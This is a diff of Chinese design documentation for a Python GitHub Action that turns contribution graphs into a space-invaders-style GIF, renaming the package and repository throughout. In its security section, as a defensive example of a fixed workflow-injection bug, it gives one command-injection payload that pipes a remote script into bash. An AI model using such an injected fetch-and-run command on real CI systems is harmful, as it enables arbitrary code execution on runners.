@@ -6,16 +6,16 @@
 
 | 文件 | 行数 | 角色 | 对外暴露面 | 可否独立执行 |
 |------|------|------|------------------|-------------|
-| `gh_pixel_pulverizer/__init__.py` | 44 | 包标记 + **版本号唯一来源** + **公共 API 统一导出** | `__version__` + 全部公共符号 | 否 |
-| `gh_pixel_pulverizer/__main__.py` | 4 | `python -m` 入口 | — | 是（`python -m gh_pixel_pulverizer`） |
-| `gh_pixel_pulverizer/cli.py` | 105 | **只做胶水**：argparse + 串流程 + 写 `$GITHUB_OUTPUT` | `main()` / `build_parser()` | 否（用 `python -m`） |
-| `gh_pixel_pulverizer/config.py` | 119 | 纯常量：调色板 / 几何 / 可调参数 | 见 [03](./03-api-reference.md) §1 | 否 |
-| `gh_pixel_pulverizer/models.py` | 92 | 7 个 `@dataclass` + `Strategy` 枚举 | 见 [03](./03-api-reference.md) §2 | 否 |
-| `gh_pixel_pulverizer/font.py` | 123 | 自绘 5×7 点阵字体（HUD 用） | `draw_text()` / `text_width()` | 否 |
-| `gh_pixel_pulverizer/data.py` | 101 | GraphQL 抓取 + 离线假数据 | `fetch_contributions()` / `generate_dummy()` | 否 |
-| `gh_pixel_pulverizer/engine.py` | 391 | 玩法逻辑：状态机 / 更新 / 碰撞 / 主循环 | `Engine` | 否 |
-| `gh_pixel_pulverizer/render.py` | 280 | 画面：`Renderer`（只读消费 Engine 状态）+ 飞船 sprite + 静态棋盘底 | `Renderer` | 否 |
-| `gh_pixel_pulverizer/gif.py` | 69 | 编码：共享调色板 + 逐帧量化 | `build_palette()` / `quantize_frame()` / `encode_gif()` | 否 |
+| `gh_space_invaders/__init__.py` | 44 | 包标记 + **版本号唯一来源** + **公共 API 统一导出** | `__version__` + 全部公共符号 | 否 |
+| `gh_space_invaders/__main__.py` | 4 | `python -m` 入口 | — | 是（`python -m gh_space_invaders`） |
+| `gh_space_invaders/cli.py` | 105 | **只做胶水**：argparse + 串流程 + 写 `$GITHUB_OUTPUT` | `main()` / `build_parser()` | 否（用 `python -m`） |
+| `gh_space_invaders/config.py` | 119 | 纯常量：调色板 / 几何 / 可调参数 | 见 [03](./03-api-reference.md) §1 | 否 |
+| `gh_space_invaders/models.py` | 92 | 7 个 `@dataclass` + `Strategy` 枚举 | 见 [03](./03-api-reference.md) §2 | 否 |
+| `gh_space_invaders/font.py` | 123 | 自绘 5×7 点阵字体（HUD 用） | `draw_text()` / `text_width()` | 否 |
+| `gh_space_invaders/data.py` | 101 | GraphQL 抓取 + 离线假数据 | `fetch_contributions()` / `generate_dummy()` | 否 |
+| `gh_space_invaders/engine.py` | 391 | 玩法逻辑：状态机 / 更新 / 碰撞 / 主循环 | `Engine` | 否 |
+| `gh_space_invaders/render.py` | 280 | 画面：`Renderer`（只读消费 Engine 状态）+ 飞船 sprite + 静态棋盘底 | `Renderer` | 否 |
+| `gh_space_invaders/gif.py` | 69 | 编码：共享调色板 + 逐帧量化 | `build_palette()` / `quantize_frame()` / `encode_gif()` | 否 |
 | `tests/test_smoke.py` | 184 | 离线冒烟测试（18 例） | — | 是（`python tests/test_smoke.py`） |
 | `action.yml` | 150 | GitHub **Composite Action** 定义 | 11 个 inputs / 3 个 outputs | 由 workflow `uses:` 调用 |
 | `.github/workflows/ci.yml` | 52 | 本仓库自身的 CI | artifact `game-gif-py*` | 由 GitHub 触发 |
@@ -24,32 +24,32 @@
 
 ---
 
-## 2. `gh_pixel_pulverizer/__init__.py`
+## 2. `gh_space_invaders/__init__.py`
 
 两个职责：
 
 1. **作为版本号的唯一来源** —— `__version__ = "0.2.0"`。`pyproject.toml` 通过
-`[tool.setuptools.dynamic] version = {attr = "gh_pixel_pulverizer.__version__"}` 读取，
+`[tool.setuptools.dynamic] version = {attr = "gh_space_invaders.__version__"}` 读取，
 避免在 `pyproject.toml` 与代码里两处维护、容易漂移。
 
 2. **统一导出公共 API** —— 把 7 个模块的公共符号 re-export 到包根，
-   外部只需要 `from gh_pixel_pulverizer import Engine`，不必知道内部文件划分。
-   （`cli.py` 也保留了一组旧导入路径，保障 `from gh_pixel_pulverizer.cli import X` 不破。）
+   外部只需要 `from gh_space_invaders import Engine`，不必知道内部文件划分。
+   （`cli.py` 也保留了一组旧导入路径，保障 `from gh_space_invaders.cli import X` 不破。）
 
 > 发版流程：只改这一行的 `__version__`，无需触碰 `pyproject.toml`。
 
 ---
 
-## 3. `gh_pixel_pulverizer/__main__.py`
+## 3. `gh_space_invaders/__main__.py`
 
 ```python
-from gh_pixel_pulverizer.cli import main
+from gh_space_invaders.cli import main
 
 if __name__ == "__main__":
     main()
 ```
 
-职责：让 `python -m gh_pixel_pulverizer <args>` 可用。
+职责：让 `python -m gh_space_invaders <args>` 可用。
 `if __name__` 守卫避免被 import 时副作用执行。
 
 ---
@@ -103,7 +103,7 @@ if __name__ == "__main__":
 
 `build_parser()` + `main()`：解析参数 → 取数据 → 建 Engine → 编码 → 写 `$GITHUB_OUTPUT`。
 除此之外还 re-export 了一组旧符号（常量 / `Contributions` / `build_palette` / `quantize_frame`），
-保证历史的 `from gh_pixel_pulverizer.cli import ...` 不破。
+保证历史的 `from gh_space_invaders.cli import ...` 不破。
 
 ### 4.9 模块内部的调用关系
 
@@ -142,7 +142,8 @@ main (cli.py) ──▶ fetch_contributions 或 generate_dummy   （data.py）
 ## 5. `action.yml` —— 对外交付形态
 
 **Composite Action**（`runs.using: "composite"`），供其他仓库用
-`uses: h1s97x/gh-pixel-pulverizer@main` 引用。
+`uses: h1s97x/gh-space-invaders@main` 引用（GitHub 侧该仓库尚未建立，
+改名前的仓库仍是 `h1s97x/gh-pixel-pulverizer`；CNB 侧地址见 README）。
 
 ### 5.1 三个 step
 
@@ -182,11 +183,11 @@ env:
   INPUT_USERNAME: ${{ inputs.username || github.repository_owner }}
   ...
 run: |
-  python3 -m gh_pixel_pulverizer "${INPUT_USERNAME}" ...
+  python3 -m gh_space_invaders "${INPUT_USERNAME}" ...
 ```
 
 **所有用户可控值一律经 `env:` 传递，再在脚本里以 `"$VAR"` 引用**。
-若直接写成 `run: python -m gh_pixel_pulverizer "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
+若直接写成 `run: python -m gh_space_invaders "${{ inputs.username }}"`，攻击者只需在 issue/workflow 输入里
 填 `$(curl evil.sh | bash)` 就能在 runner 上执行任意命令。这是历史提交 `94f4237` 修复的问题。
 
 ### 5.5 Step ③ 的提交策略
@@ -201,9 +202,9 @@ if 暂存区中 $OUTPUT 无 diff                → 退出（内容没变，不�
 if no-amend != 'true'
    and 没有其他已暂存改动
    and 没有其他未暂存改动
-   and 上一条 commit message 形如 "💥*pixel-pulverizer*"
+   and 上一条 commit message 形如 "💥*space-invaders*"
                                            → git commit --amend --no-edit && git push --force-with-lease
-else                                       → 新建 commit "💥 pixel-pulverizer: update $GITHUB_RUN_ID" && git push
+else                                       → 新建 commit "💥 space-invaders: update $GITHUB_RUN_ID" && git push
 ```
 
 设计意图：**定时任务每天跑一次，若每次都新建 commit 会让贡献历史被自己的机器人刷屏**。
@@ -223,7 +224,7 @@ else                                       → 新建 commit "💥 pixel-pulveri
 | Step 2 | `actions/setup-python@v5` |
 | Step 3 | `pip install --upgrade pip pillow` |
 | Step 4 | `python -m unittest discover -s tests -v` |
-| Step 5 | 端到端：`python -m gh_pixel_pulverizer octocat --offline -o game.gif --seed 7` + 断言 `size > 0` |
+| Step 5 | 端到端：`python -m gh_space_invaders octocat --offline -o game.gif --seed 7` + 断言 `size > 0` |
 | Step 6 | `actions/upload-artifact@v4` 上传 `game.gif`，保留 7 天 |
 
 > **注意**：CI 不安装本项目包，而是靠 `tests/test_smoke.py` 里手动 `sys.path.insert(0, 仓库根)` 来导包。
@@ -251,7 +252,7 @@ else                                       → 新建 commit "💥 pixel-pulveri
                      ┌────────────────────┐
                      │  tests/test_smoke  │
                      └─────────┬──────────┘
-                               │ from gh_pixel_pulverizer import (...)
+                               │ from gh_space_invaders import (...)
                                ▼
       ┌──────────────┐   ┌─────────────────────┐
       │ __main__.py  │──▶│       cli.py        │
